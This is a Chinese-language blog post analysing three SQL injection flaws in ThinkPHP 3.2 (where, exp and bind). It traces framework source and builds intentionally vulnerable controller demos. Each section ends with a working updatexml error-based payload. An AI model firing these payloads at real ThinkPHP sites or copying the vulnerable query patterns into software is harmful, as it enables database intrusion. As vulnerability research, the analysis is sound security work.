[{"title":"ThinkPHP3.2 where注入分析","url":"/2020/02/26/ThinkPHP3-2-where注入分析/","content":"\n#### **where注入**\n\n在控制器中，写个demo，利用字符串方式作为where传参时存在注入\n\n```php\npublic function  getuser(){\n    $user = M('User')->where('id='.I('id'))->find();\n    dump($user);\n}\n```\n\n在变量user地方进行断点，PHPSTROM F7进入，I方法获取传入的参数\n\n```php\nswitch(strtolower($method)) {\n        case 'get'     :   \n        \t$input =& $_GET;\n        \tbreak;\n        case 'post'    :   \n        \t$input =& $_POST;\n        \tbreak;\n        case 'put'     :   \n        \tif(is_null($_PUT)){\n            \tparse_str(file_get_contents('php://input'), $_PUT);\n        \t}\n        \t$input \t=\t$_PUT;        \n        \tbreak;\n        case 'param'   :\n            switch($_SERVER['REQUEST_METHOD']) {\n                case 'POST':\n                    $input  =  $_POST;\n                    break;\n                case 'PUT':\n                \tif(is_null($_PUT)){\n                    \tparse_str(file_get_contents('php://input'), $_PUT);\n                \t}\n                \t$input \t=\t$_PUT;\n                    break;\n                default:\n                    $input  =  $_GET;\n            }\n            break;\n ......\n```\n\n重点看过滤函数\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/1.jpg)\n\n先利用htmlspecialchars函数过滤参数，在402行利用think_filter函数过滤常规sql函数\n\n```php\nfunction think_filter(&$value){\n\t// TODO 其他安全过滤\n\n\t// 过滤查询特殊字符\n    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){\n        $value .= ' ';\n    }\n}\n```\n\n在where方法中，将$where的值放入到options[\"where\"]数组中\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/2.png)\n\n继续跟进查看find方法，第748行\n\n```php\n$options     =   $this->_parseOptions($options);\n```\n\n在数组$options中增加'table'=>'tp_user'，'model'=>'User'，随后F7跟进select方法\n\n```php\npublic function select($options=array()) {\n        $this->model  =   $options['model'];\n        $this->parseBind(!empty($options['bind'])?$options['bind']:array());\n        $sql    = $this->buildSelectSql($options);\n        $result   = $this->query($sql,!empty($options['fetch_sql']) ? true : false);\n        return $result;\n}\n```\n\n跟进buildSelectSql方法，继续在跟进parseSql方法，这里可以看到生成完整的sql语句\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/3.png)\n\n这里主要查看parseWhere方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/4.png)\n\n跟进parseThinkWhere方法\n\n```php\nprotected function parseThinkWhere($key,$val) {\n        $whereStr   = '';\n        switch($key) {\n            case '_string':\n                // 字符串模式查询条件\n                $whereStr = $val;\n                break;\n            case '_complex':\n                // 复合查询条件\n                $whereStr = substr($this->parseWhere($val),6);\n                break;\n```\n\n$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)，所以最终payload为\n\n```\n1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/5.png)\n\n#### **exp注入**\n\n漏洞demo，这里使用全局数组进行传参(不要用I方法)，漏洞才能生效\n\n```php\npublic function  getuser(){\n        $User = D('User');\n        $map = array('id' => $_GET['id']);\n        $user = $User->where($map)->find();\n        dump($user);\n}\n```\n\n直接在$user进行断点，F7跟进，跳过where方法，跟进find->select->buildSelectSql->parseSql->parseWhere\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/1.png)\n\n跟进parseWhereItem方法，此时参数$val为一个数组，{'exp','sql注入exp'}\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/2.png)\n\n此时当$exp满足exp时，将参数和值就行拼接，所以最终paylaod为\n\n```\nid[0]=exp&id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/3.png)\n\n上面至于为什么不能用I方法，原因是在过滤函数think_filter中能匹配到exp字符，所以在exp字符后面加了一个空格，导致在parseWhereItem方法中无法等于exp。\n\n```php\nif(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value))\n```\n\n#### **bind注入**\n\n漏洞demo\n\n```php\npublic function  getuser(){\n        $data['id'] = I('id');\n        $uname['username'] = I('username');\n        $user = M('User')->where($data)->save($uname);\n        dump($user);\n}\n```\n\nF8跟进save方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/4.png)\n\n生成sql语句在update方法中\n\n```php\npublic function update($data,$options) {\n        $this->model  =   $options['model'];\n        $this->parseBind(!empty($options['bind'])?$options['bind']:array());\n        $table  =   $this->parseTable($options['table']);\n        $sql   = 'UPDATE ' . $table . $this->parseSet($data);\n        if(strpos($table,',')){// 多表更新支持JOIN操作\n            $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:'');\n        }\n        $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');\n        if(!strpos($table,',')){\n            //  单表更新支持order和lmit\n            $sql   .=  $this->parseOrder(!empty($options['order'])?$options['order']:'')\n                .$this->parseLimit(!empty($options['limit'])?$options['limit']:'');\n        }\n        $sql .=   $this->parseComment(!empty($options['comment'])?$options['comment']:'');\n        return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);\n    }\n```\n\n在parseSet方法中，可以将传入的参数替换成:0\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/5.png)\n\n在bindParam方法中，$this->bind属性返回array(':0'=>参数值)\n\n```php\nprotected function bindParam($name,$value){\n        $this->bind[':'.$name]  =   $value;\n}\n```\n\n继续跟进parseWhere->parseWhereItem方法，当exp为bind时，就会在参数值前面加个冒号(:)\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/6.png)\n\n由于在sql语句中有冒号，继续跟进excute方法，这里将:0替换成了第二个参数的值\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/7.png)\n\n所以最终的payload为\n\n```\nid[0]=bind&id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&username=fanxing\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png)\n"}]